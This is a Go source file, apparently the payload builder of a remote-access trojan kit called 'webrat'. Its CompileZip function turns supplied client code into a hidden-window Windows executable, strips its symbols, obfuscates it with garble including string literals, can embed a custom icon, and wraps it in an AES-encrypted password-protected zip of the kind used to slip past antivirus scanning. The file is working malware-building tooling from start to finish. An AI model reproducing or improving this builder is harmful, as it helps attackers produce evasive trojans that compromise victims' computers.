package compiler

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"bufio"
	"strings"
	"time"

	"github.com/yeka/zip"
)

func readGoModulePath(goModPath string) string {
	f, err := os.Open(goModPath)
	if err != nil {
		return ""
	}
	defer f.Close()

	s := bufio.NewScanner(f)
	for s.Scan() {
		line := strings.TrimSpace(s.Text())
		if line == "" || strings.HasPrefix(line, "//") {
			continue
		}
		if strings.HasPrefix(line, "module ") {
			mod := strings.TrimSpace(strings.TrimPrefix(line, "module "))
			mod = strings.Trim(mod, "\"`")
			if strings.Contains(mod, " ") {
				mod = strings.Fields(mod)[0]
			}
			return strings.TrimSpace(mod)
		}
	}
	return ""
}

func randomGarbleSeed() string {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return "random"
	}
	return hex.EncodeToString(b)
}

func findGoModDir(start string, maxParents int) (string, bool) {
	if strings.TrimSpace(start) == "" {
		return "", false
	}

	dir := filepath.Clean(start)
	for i := 0; i <= maxParents; i++ {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir, true
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	return "", false
}

type Request struct {
	Code       string
	Name       string
	Password   string
	Icon       []byte
	ForceAdmin string
}

func sanitizeFileName(name string) string {
	name = strings.TrimSpace(name)
	if name == "" {
		return "build"
	}
	re := regexp.MustCompile(`[^a-zA-Z0-9_-]+`)
	clean := re.ReplaceAllString(name, "_")
	if len(clean) == 0 {
		return "build"
	}
	return clean
}

func CompileZip(ctx context.Context, baseDir string, req Request, onProgress func(int)) ([]byte, string, error) {
	if onProgress == nil {
		onProgress = func(int) {}
	}
	onProgress(5)
	if ctx == nil {
		ctx = context.Background()
	}
	if strings.TrimSpace(req.Code) == "" {
		return nil, "", errors.New("missing code")
	}

	onProgress(10)
	if dir, ok := findGoModDir(baseDir, 0); ok {
		baseDir = dir
	} else {
		if exe, err := os.Executable(); err == nil {
			exeDir := filepath.Dir(exe)
			if dir, ok := findGoModDir(exeDir, 10); ok {
				baseDir = dir
			}
		}
		if strings.TrimSpace(baseDir) == "" {
			if wd, err := os.Getwd(); err == nil {
				if dir, ok := findGoModDir(wd, 10); ok {
					baseDir = dir
				}
			}
		}
		if strings.TrimSpace(baseDir) == "" {
			return nil, "", errors.New("go.mod not found: invalid compiler baseDir")
		}
	}

	buildName := sanitizeFileName(req.Name)
	if len(buildName) > 25 {
		buildName = buildName[:25]
	}

	password := req.Password
	if password == "" {
		password = "0000"
	}

	projectTmpRoot := filepath.Join(os.TempDir(), "webrat_build_tmp")
	if err := os.MkdirAll(projectTmpRoot, 0o755); err != nil {
		return nil, "", err
	}

	tmpDir, err := os.MkdirTemp(projectTmpRoot, "webrat-build-*")
	if err != nil {
		return nil, "", err
	}
	defer os.RemoveAll(tmpDir)

	onProgress(15)
	srcPath := filepath.Join(tmpDir, "client.go")
	if err := os.WriteFile(srcPath, []byte(req.Code), 0o644); err != nil {
		return nil, "", err
	}

	if len(req.Icon) > 0 {
		rsrcPath, err := exec.LookPath("rsrc")
		if err != nil {
			candidates := []string{}
			if gp := strings.TrimSpace(os.Getenv("GOPATH")); gp != "" {
				candidates = append(candidates, filepath.Join(gp, "bin", "rsrc"))
			}
			candidates = append(candidates,
				"/root/go/bin/rsrc",
				"/usr/local/bin/rsrc",
				"/usr/bin/rsrc",
			)

			statErrs := make([]string, 0, len(candidates))
			for _, p := range candidates {
				if p == "" {
					continue
				}
				if _, stErr := os.Stat(p); stErr == nil {
					rsrcPath = p
					break
				} else {
					statErrs = append(statErrs, p+": "+stErr.Error())
				}
			}

			if strings.TrimSpace(rsrcPath) == "" {
				pathEnv := strings.TrimSpace(os.Getenv("PATH"))
				gpEnv := strings.TrimSpace(os.Getenv("GOPATH"))
				details := "PATH=" + pathEnv + "\nGOPATH=" + gpEnv
				if len(statErrs) > 0 {
					details += "\nTried:\n" + strings.Join(statErrs, "\n")
				}
				return nil, "", errors.New("icon embed error (rsrc): rsrc not found\n" + details)
			}
		}

		iconPath := filepath.Join(tmpDir, "icon.ico")
		if err := os.WriteFile(iconPath, req.Icon, 0o644); err != nil {
			return nil, "", err
		}

		rsrcCtx, rsrcCancel := context.WithTimeout(ctx, 30*time.Second)
		defer rsrcCancel()

		rsrcOut := filepath.Join(tmpDir, "rsrc.syso")
		rsrcCmd := exec.CommandContext(rsrcCtx, rsrcPath, "-ico", iconPath, "-o", rsrcOut)
		rsrcCmd.Dir = tmpDir
		rsrcCmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")

		out, err := rsrcCmd.CombinedOutput()
		if err != nil {
			msg := strings.TrimSpace(string(out))
			if msg == "" {
				msg = err.Error()
			}
			return nil, "", errors.New("icon embed error (rsrc):\n" + msg)
		}
	}

	onProgress(20)
	copyFile := func(src, dst string) error {
		in, err := os.Open(src)
		if err != nil {
			return err
		}
		defer in.Close()

		out, err := os.Create(dst)
		if err != nil {
			return err
		}
		defer out.Close()

		_, err = io.Copy(out, in)
		return err
	}

	if err := copyFile(filepath.Join(baseDir, "go.mod"), filepath.Join(tmpDir, "go.mod")); err != nil {
		return nil, "", fmt.Errorf("copy %s: %w", filepath.Join(baseDir, "go.mod"), err)
	}
	if err := copyFile(filepath.Join(baseDir, "go.sum"), filepath.Join(tmpDir, "go.sum")); err != nil {
		return nil, "", fmt.Errorf("copy %s: %w", filepath.Join(baseDir, "go.sum"), err)
	}

	exeName := buildName + ".exe"
	exePath := filepath.Join(tmpDir, exeName)

	buildArgs := []string{
		"build", "-ldflags", "-H=windowsgui -s -w -buildid= -linkmode=internal", "-o", exePath, ".",
	}

	env := make([]string, 0, len(os.Environ())+8)
	for _, kv := range os.Environ() {
		if strings.HasPrefix(kv, "GOFLAGS=") {
			continue
		}
		env = append(env, kv)
	}
	env = append(env,
		"GOOS=windows",
		"GOARCH=amd64",
		"CGO_ENABLED=0",
		"GOFLAGS=-mod=mod",
		"GOTMPDIR="+tmpDir,
	)
	if v := strings.TrimSpace(os.Getenv("WEBRAT_GOMAXPROCS")); v != "" {
		env = append(env, "GOMAXPROCS="+v)
	}

	onProgress(30)
	dlCtx, dlCancel := context.WithTimeout(ctx, 4*time.Minute)
	defer dlCancel()

	dlCmd := exec.CommandContext(dlCtx, "go", "mod", "download")
	dlCmd.Dir = tmpDir
	dlCmd.Env = env

	var dlStderr bytes.Buffer
	dlCmd.Stderr = &dlStderr
	if err := dlCmd.Run(); err != nil {
		msg := strings.TrimSpace(dlStderr.String())
		if msg == "" {
			msg = err.Error()
		}
		return nil, "", errors.New("module download error:\n" + msg)
	}

	onProgress(45)
	findOrInstallTool := func(module string, name string) (string, error) {
		if p, err := exec.LookPath(name); err == nil && strings.TrimSpace(p) != "" {
			return p, nil
		}

		candidates := []string{}
		if gp := strings.TrimSpace(os.Getenv("GOPATH")); gp != "" {
			candidates = append(candidates, filepath.Join(gp, "bin", name))
		}
		candidates = append(candidates,
			filepath.Join(tmpDir, "bin", name),
			"/root/go/bin/"+name,
			"/usr/local/bin/"+name,
			"/usr/bin/"+name,
		)
		for _, p := range candidates {
			if strings.TrimSpace(p) == "" {
				continue
			}
			if _, stErr := os.Stat(p); stErr == nil {
				return p, nil
			}
		}

		toolCtx, toolCancel := context.WithTimeout(ctx, 2*time.Minute)
		defer toolCancel()

		gobin := filepath.Join(tmpDir, "bin")
		_ = os.MkdirAll(gobin, 0o755)

		toolEnv := make([]string, 0, len(os.Environ())+2)
		for _, kv := range os.Environ() {
			if strings.HasPrefix(kv, "GOOS=") || strings.HasPrefix(kv, "GOARCH=") || strings.HasPrefix(kv, "CGO_ENABLED=") || strings.HasPrefix(kv, "GOFLAGS=") || strings.HasPrefix(kv, "GOTMPDIR=") || strings.HasPrefix(kv, "GOGARBLE=") {
				continue
			}
			toolEnv = append(toolEnv, kv)
		}
		toolEnv = append(toolEnv, "GOBIN="+gobin)

		instCmd := exec.CommandContext(toolCtx, "go", "install", module)
		instCmd.Dir = tmpDir
		instCmd.Env = toolEnv

		out, err := instCmd.CombinedOutput()
		if err != nil {
			msg := strings.TrimSpace(string(out))
			if msg == "" {
				msg = err.Error()
			}
			return "", errors.New("tool install error (" + name + "):\n" + msg)
		}

		p := filepath.Join(gobin, name)
		if _, stErr := os.Stat(p); stErr == nil {
			return p, nil
		}

		pathEnv := strings.TrimSpace(os.Getenv("PATH"))
		gpEnv := strings.TrimSpace(os.Getenv("GOPATH"))
		return "", errors.New("tool not found after install (" + name + ")\nPATH=" + pathEnv + "\nGOPATH=" + gpEnv)
	}

	garblePath, err := findOrInstallTool("mvdan.cc/garble@latest", "garble")
	if err != nil {
		return nil, "", err
	}

	garbleFlags := []string{}
	goExtraFlags := []string{}
	if v, ok := os.LookupEnv("WEBRAT_GARBLE_FLAGS"); ok {
		fields := strings.Fields(v)
		knownGarbleNoArg := map[string]struct{}{
			"-literals": {},
			"-debug":    {},
		}
		knownGarbleWithArg := map[string]struct{}{
			"-seed":     {},
			"-debugdir": {},
		}
		for i := 0; i < len(fields); i++ {
			f := fields[i]
			if _, ok := knownGarbleNoArg[f]; ok {
				garbleFlags = append(garbleFlags, f)
				continue
			}
			if strings.HasPrefix(f, "-seed=") || strings.HasPrefix(f, "-debugdir=") {
				if strings.HasPrefix(f, "-seed=") {
					seed := strings.TrimSpace(strings.TrimPrefix(f, "-seed="))
					if seed == "" || seed == "random" {
						seed = randomGarbleSeed()
					}
					garbleFlags = append(garbleFlags, "-seed="+seed)
					continue
				}
				garbleFlags = append(garbleFlags, f)
				continue
			}
			if _, ok := knownGarbleWithArg[f]; ok {
				garbleFlags = append(garbleFlags, f)
				if i+1 < len(fields) {
					if f == "-seed" {
						seed := strings.TrimSpace(fields[i+1])
						if seed == "" || seed == "random" {
							seed = randomGarbleSeed()
						}
						garbleFlags = append(garbleFlags, seed)
					} else {
						garbleFlags = append(garbleFlags, fields[i+1])
					}
					i++
				}
				continue
			}
			goExtraFlags = append(goExtraFlags, f)
		}
	} else {
		garbleFlags = []string{"-literals", "-seed=" + randomGarbleSeed()}
		goExtraFlags = []string{"-trimpath"}
	}

	onProgress(60)
	buildCtx, buildCancel := context.WithTimeout(ctx, 9*time.Minute)
	defer buildCancel()

	garbleArgs := make([]string, 0, len(garbleFlags)+1+len(goExtraFlags)+len(buildArgs))
	garbleArgs = append(garbleArgs, garbleFlags...)
	garbleArgs = append(garbleArgs, "build")
	garbleArgs = append(garbleArgs, goExtraFlags...)
	garbleArgs = append(garbleArgs, buildArgs[1:]...)

	cmd := exec.CommandContext(buildCtx, garblePath, garbleArgs...)
	cmd.Dir = tmpDir
	gog := strings.TrimSpace(os.Getenv("WEBRAT_GOGARBLE"))
	if gog == "" {
		mod := readGoModulePath(filepath.Join(baseDir, "go.mod"))
		if mod != "" {
			gog = mod + "," + mod + "/..."
		} else {
			gog = "*"
		}
	}
	cmd.Env = append(env, "GOGARBLE="+gog)

	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		msg := strings.TrimSpace(stderr.String())
		if msg == "" {
			msg = err.Error()
		}
		return nil, "", errors.New("compile error:\n" + msg)
	}

	onProgress(90)
	exeFile, err := os.Open(exePath)
	if err != nil {
		return nil, "", err
	}
	defer exeFile.Close()

	buf := &bytes.Buffer{}
	zw := zip.NewWriter(buf)

	wExe, err := zw.Encrypt(exeName, password, zip.AES256Encryption)
	if err != nil {
		return nil, "", err
	}
	if _, err := io.Copy(wExe, exeFile); err != nil {
		return nil, "", err
	}

	logo := "" +
		"██     ██ ███████ ██████   ██████ ██████  ██    ██ ███████ ████████  █████  ██      \n" +
		"██     ██ ██      ██   ██ ██      ██   ██  ██  ██  ██         ██    ██   ██ ██      \n" +
		"██  █  ██ █████   ██████  ██      ██████    ████   ███████    ██    ███████ ██      \n" +
		"██ ███ ██ ██      ██   ██ ██      ██   ██    ██         ██    ██    ██   ██ ██      \n" +
		" ███ ███  ███████ ██████   ██████ ██   ██    ██    ███████    ██    ██   ██ ███████ \n"

	infoText := fmt.Sprintf("%s\n\nPassword: %s\nName: %s\nDate: %s\n",
		logo, password, buildName, time.Now().Format("2006-01-02 15:04:05"),
	)

	wInfo, err := zw.Create("INFO.txt")
	if err != nil {
		return nil, "", err
	}
	if _, err := wInfo.Write([]byte(infoText)); err != nil {
		return nil, "", err
	}

	if err := zw.Close(); err != nil {
		return nil, "", err
	}

	archiveName := buildName + ".zip"
	data := buf.Bytes()
	_ = json.Valid(data)
	onProgress(100)
	return data, archiveName, nil
}